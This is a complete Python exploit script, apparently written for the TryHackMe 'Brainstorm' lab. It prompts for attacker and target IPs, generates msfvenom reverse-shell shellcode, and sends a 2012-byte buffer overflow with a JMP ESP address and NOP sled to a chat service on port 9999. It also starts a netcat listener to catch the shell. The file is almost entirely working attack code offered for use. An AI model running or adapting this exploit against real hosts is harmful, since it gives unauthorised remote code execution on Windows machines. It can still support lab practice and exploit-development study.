import netifaces as ni
import socket
import sys
import ipaddress
import time
import subprocess
import os
import pyfiglet
import itertools
import threading


def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('Payload Development Completed Successfully!\n     ')


os.system('cls' if os.name == 'nt' else 'clear')

# Settings
RHOST = "127.0.0.1"             # target port number
RPORT = 9999                     # target port number
LHOST = "127.0.0.1"             # target port number
LPORT = 4444  # Port number for reverse shell listening.
username = b"Brainstorm"  # Username back on chatserver application

ans = True
while ans:
    ascii_banner = pyfiglet.figlet_format("BRAINSTORM")
    print(ascii_banner)
    print("""
What network is the machine you are exploiting on?\n
[1] Local Network Loopback: "lo"
[2] Ethernet Interface 0:   "eth0"
[3] Try Hack Me Network:    "tun0"
[4] Custom:                 "User Specified IP"
""")
    ans = input("Please enter your option: ")
    if ans == "1":
        ni.ifaddresses('lo')
        LHOST = ni.ifaddresses('lo')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "2":
        ni.ifaddresses('eth0')
        LHOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "3":
        ni.ifaddresses('tun0')
        LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "4":
        while True:
            try:
                LHOST = ipaddress.ip_address(
                    input('\nPlease Enter the Custom IP address of your local mahine on the network: '))
                break
            except ValueError:
                print('\nYou entered an invalid IP Adress, please try again... ')
                time.sleep(2)

        print("\nLocal IP Address set as: ", LHOST)
        break
    elif ans != "":
        print("\n****Not Valid Choice, Try again****")
        time.sleep(2)
        print("\nWhat would you like to do?")
        os.system('cls' if os.name == 'nt' else 'clear')

while True:
    try:
        RHOST = ipaddress.ip_address(
            input('\nPlease Enter the IP address of the machine you wish to attack: '))
        break
    except ValueError:
        print('You entered an invalid IP Adress, please try again... ')
        time.sleep(2)
        continue

print("\nRemote machine IP Address set as: ", RHOST)
RHOST = bytes(str(RHOST), encoding='utf-8')

LPORT = input('\nPlease Enter the Port you wish to listen on your machine: ')

print("\nGenerating Exploit code for injection, Please Standby...\n")

done = False
t = threading.Thread(target=animate)
t.start()
time.sleep(2)

# shellcode generation
buf = None
output = subprocess.getoutput(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -b '\\x00\\n\\r\\x20' -f py 2>/dev/null")
exec(output)
assert buf is not None
payload = buf

done = True
time.sleep(2)

# payload crafting
byteLength = b"A" * 2012
nops = b"\x90" * 10

###############################################################################################
# This information is based on the machines service module and JMP command (!mona find -s "\xff\xe4" -m essfunc.dll)
# If the JMP address does not work, you can substitute for the below other JMP points...

#JMP = b"\xeb\x14\x50\x62"
JMP = b"\xdf\x14\x50\x62"
#JMP = b"\xeb\x14\x50\x62"
#JMP = b"\xf7\x14\x50\x62"
#JMP = b"\x03\x15\x50\x62"
#JMP = b"\x0f\x15\x50\x62"
#JMP = b"\x1b\x15\x50\x62"
#JMP = b"\x27\x15\x50\x62"
#JMP = b"\x33\x15\x50\x62"
#JMP = b"\x35\x15\x50\x62"

###############################################################################################
message = byteLength + JMP + nops

# perform the attack and opening a nc session in a seperate terminal
print("\nAttacking machine, please standby for connection and exploit...\n")
output = subprocess.getoutput(f'gnome-terminal -x bash -c "nc -nlvp {LPORT}; exec bash"')
exec(output)
time.sleep(1)

try:
    print("Trying initial coonnection with:", RHOST.decode('utf8'), "\n")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    time.sleep(1)
    print("CONNECTION SUCCESS!, Sending payload and breaking the program...")
    s.recv(1024)
    time.sleep(1)
    s.send(b"Brainstorm" + b'\r\n')
    print("\nUsername sent successfully...")
    time.sleep(1)
    s.send(message + payload + b'\r\n')
    print("\nPayload sent successfully...")
    s.recv(1024)
    time.sleep(1)
    s.close()

    ans = True
    while ans:
        print("""
    Did the exploit cause a reverse shell on your machine?\n
    ["yes"] The program will close
    ["no"]  The program will run again and retry the attempt
    """)
        ans = input("Please enter your option: ")
        if ans == "yes":
            print("\nThank you for using this application...")
            time.sleep(2)
            break
        elif ans == "no":
            print("\nThank you, Re-Trying Attack on Remote Host:", LHOST + "\n")
            time.sleep(2)
            try:
                print("Trying initial coonnection with:", RHOST.decode('utf8'), "\n")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((RHOST, RPORT))
                time.sleep(1)
                print("CONNECTION SUCCESS!, Sending payload and breaking the program...")
                s.recv(1024)
                time.sleep(1)
                s.send(b"Brainstorm" + b'\r\n')
                print("\nUsername sent successfully...")
                time.sleep(1)
                s.send(message + payload + b'\r\n')
                print("\nPayload sent successfully...")
                s.recv(1024)
                time.sleep(1)
                s.close()

            except Exception as e:
                print("The server is not available to connect to. Recheck your connection to the Remote Host and try running this application again.\n")
                print(e)
                sys.exit()

        elif ans != "":
            print("\n****Not Valid Choice, Try again****\n")
            time.sleep(2)
            continue

except Exception as e:
    print("The server is not available to connect to. Recheck your connection to the Remote Host and try running this application again.\n")
    print(e)
    sys.exit()

#r = remote(RHOST, RPORT)
#r.sendafter(": ", username+b'\r\n')
#r.sendafter(": ", message + buf + b'\r\n')
# r.close()
# r.interactive()